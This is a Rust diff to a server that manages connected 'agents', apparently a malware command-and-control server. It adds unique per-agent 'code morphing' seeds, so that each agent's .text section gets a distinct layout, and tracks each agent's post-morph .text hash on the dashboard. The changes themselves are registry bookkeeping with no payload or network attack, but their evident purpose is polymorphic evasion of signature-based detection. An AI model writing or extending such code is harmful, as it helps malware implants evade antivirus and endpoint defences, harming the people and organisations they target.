@@ -11,7 +11,8 @@
 use crate::audit::AuditLog;
 use crate::config::ServerConfig;
 use common::Message;
-use dashmap::DashMap;
+use dashmap::{DashMap, DashSet};
+use rand::RngCore;
 use serde::Serialize;
 use std::sync::Arc;
 use tokio::sync::{mpsc, oneshot};
@@ -29,6 +30,13 @@ pub struct AgentEntry {
     /// Channel into the per-connection writer task.
     pub tx: mpsc::Sender<Message>,
     pub peer: String,
+    /// Seed assigned by the server for per-session code morphing.  Sent to
+    /// the agent during initial check-in and used to ensure no two active
+    /// sessions share the same transformation seed.
+    pub morph_seed: u64,
+    /// SHA-256 hash of the agent's `.text` section after the most recent
+    /// morph operation.  Updated when the agent reports a `MorphResult`.
+    pub text_hash: Option<String>,
 }
 
 /// JSON-friendly snapshot of an agent for the dashboard.
@@ -39,6 +47,8 @@ pub struct AgentView {
     pub hostname: String,
     pub last_seen: u64,
     pub peer: String,
+    pub morph_seed: u64,
+    pub text_hash: Option<String>,
 }
 
 impl From<&AgentEntry> for AgentView {
@@ -49,6 +59,8 @@ impl From<&AgentEntry> for AgentView {
             hostname: e.hostname.clone(),
             last_seen: e.last_seen,
             peer: e.peer.clone(),
+            morph_seed: e.morph_seed,
+            text_hash: e.text_hash.clone(),
         }
     }
 }
@@ -61,6 +73,10 @@ pub struct AppState {
     pub admin_token: String,
     pub command_timeout_secs: u64,
     pub config: ServerConfig,
+    /// Set of morph seeds currently assigned to active agents.  Ensures no
+    /// two concurrent sessions share the same seed, guaranteeing that each
+    /// agent produces a unique `.text` section layout after morphing.
+    pub assigned_seeds: DashSet<u64>,
 }
 
 impl AppState {
@@ -77,7 +93,28 @@ impl AppState {
             admin_token,
             command_timeout_secs,
             config,
+            assigned_seeds: DashSet::new(),
         }
+    }
+
+    /// Generate a unique morph seed that is not currently assigned to any
+    /// active agent.  Uses rejection sampling with a random u64; collisions
+    /// are astronomically unlikely but the loop guarantees correctness.
+    pub fn generate_unique_seed(&self) -> u64 {
+        let mut rng = rand::thread_rng();
+        loop {
+            let seed = rng.next_u64();
+            // Avoid zero — it's the "no seed set" sentinel in the agent.
+            if seed != 0 && !self.assigned_seeds.contains(&seed) {
+                return seed;
+            }
+        }
+    }
+
+    /// Release a morph seed back to the available pool (called when an agent
+    /// disconnects).
+    pub fn release_seed(&self, seed: u64) {
+        self.assigned_seeds.remove(&seed);
     }
 
     pub fn list_agents(&self) -> Vec<AgentView> {
@@ -101,6 +138,15 @@ impl AppState {
     /// Find an agent entry by its server-assigned `connection_id`.
     pub fn find_by_connection_id(&self, connection_id: &str) -> Option<AgentEntry> {
         self.registry.get(connection_id).map(|e| e.value().clone())
+    }
+
+    /// Record the SHA-256 hash of an agent's `.text` section after a morph
+    /// operation.  Called when the agent sends a `MorphResult` message or
+    /// when a `MorphNow` command response contains the hash.
+    pub fn update_text_hash(&self, connection_id: &str, hash: &str) {
+        if let Some(mut entry) = self.registry.get_mut(connection_id) {
+            entry.value_mut().text_hash = Some(hash.to_string());
+        }
     }
 }
 
